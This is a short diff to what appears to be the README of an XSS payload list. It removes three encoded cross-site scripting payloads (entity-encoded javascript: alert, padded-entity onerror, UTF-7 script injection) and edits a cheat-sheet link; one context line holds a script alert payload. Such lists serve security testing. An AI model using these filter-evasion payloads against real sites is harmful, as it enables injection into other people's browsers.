@@ -1,9 +1,5 @@
-<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+Injections for testing
 
-
-<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
-
-<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
 
 ###  Cross Site Scripting ( XSS ) Vulnerability Payload List 
 
@@ -2749,7 +2745,7 @@ foo<script>alert(1)</script>
 
 ###### Cross-Site Scripting (XSS) Cheat Sheet | Veracode
 
-*  https://www.veracode.com/security/xss
+* 👉 https://www.veracode.com/security/xss
 
 #### Recommended books :
 
